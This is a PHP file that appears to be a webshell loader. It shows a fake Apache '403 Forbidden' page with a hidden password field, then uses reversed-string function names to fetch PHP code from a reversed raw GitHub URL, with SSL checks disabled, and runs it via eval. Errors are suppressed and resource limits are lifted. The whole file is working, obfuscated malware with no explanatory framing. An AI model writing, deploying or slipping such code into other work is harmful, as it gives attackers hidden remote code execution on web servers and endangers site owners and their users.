<?php
$a1a = chr(103) . chr(97) . chr(110) . chr(122) . chr(116) . chr(101) . chr(110) . chr(103);
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", -1);
$b2b = md5(__FILE__);

if (!empty($a1a) && $_SESSION[$b2b] != $a1a) {
    if (isset($_REQUEST['pass']) && $_REQUEST['pass'] == $a1a) {
        $_SESSION[$b2b] = $a1a;
    } else {
        echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access this page on this server.</p><hr><address>Apache Server at " . $_SERVER["HTTP_HOST"] . " Port 80 </address>
        <style>input { margin: 0; background-color: #fff; border: 1px solid #fff; }</style>
        <center><form method='post'><input type='password' name='pass'></form></center></body></html>";
        exit;
    }
}
?>

<?php
session_start();
error_reporting(0);

class Z1 {
    private $Z2;
    private $Z3;

    public function __construct() {
        $this->Z2 = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
        $this->Z3 = array(
            'crl' => array(
                'exec' => strrev('cexe_lruc'),
                'init' => strrev('tini_lruc'),
                'opt' => strrev('tpotes_lruc'),
                'close' => strrev('esolc_lruc')
            ),
            'file' => array(
                'getContents' => strrev('stnetnoc_teg_elif'),
                'open' => strrev('nepof'),
                'streamContents' => strrev('stnetnoc_teg_maerts'),
                'close' => strrev('esolcf')
            )
        );
    }

    private function A4($B5) {
        return base64_encode(strrev($B5));
    }

    private function A6($B5) {
        return strrev(base64_decode($B5));
    }

    private function B7($C8, $D9) {
        return $this->Z3[$C8][$D9];
    }

    public function E0($F1) {
        $G2 = $this->B7('crl', 'exec');
        $H3 = $this->B7('file', 'getContents');
        $I4 = $this->B7('file', 'open');
        $J5 = $this->B7('file', 'streamContents');

        if (function_exists($G2)) {
            return $this->O0($F1);
        } elseif (function_exists($H3)) {
            return $H3($F1);
        } elseif (function_exists($I4) && function_exists($J5)) {
            return $this->Q2($F1);
        } else {
            return false;
        }
    }

    private function O0($F1) {
        $R3 = $this->B7('crl', 'init');
        $S4 = $this->B7('crl', 'opt');
        $T5 = $this->B7('crl', 'close');
        $U6 = $this->B7('crl', 'exec');

        $V7 = $R3($F1);
        $S4($V7, CURLOPT_RETURNTRANSFER, 1);
        $S4($V7, CURLOPT_FOLLOWLOCATION, 1);
        $S4($V7, CURLOPT_USERAGENT, $this->Z2);
        $S4($V7, CURLOPT_SSL_VERIFYPEER, 0);
        $S4($V7, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION[$this->A4('icikiwir')])) {
            $S4($V7, CURLOPT_COOKIE, $_SESSION[$this->A4('icikiwir')]);
        }

        $W8 = $U6($V7);
        $T5($V7);

        return $W8;
    }

    private function Q2($F1) {
        $X9 = $this->B7('file', 'open');
        $Y0 = $this->B7('file', 'streamContents');
        $Z1 = $this->B7('file', 'close');

        $A2 = $X9($F1, "r");
        $B3 = $Y0($A2);
        $Z1($A2);

        return $B3;
    }
}

$C2 = new Z1();
$D3 = strrev('txt.7/niam/sdaeh/sfer/XoX/ykzzR/moc.tnetnocresubuhtig.war//:sptth');
$E4 = $C2->E0($D3);

/****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $E4);
?>
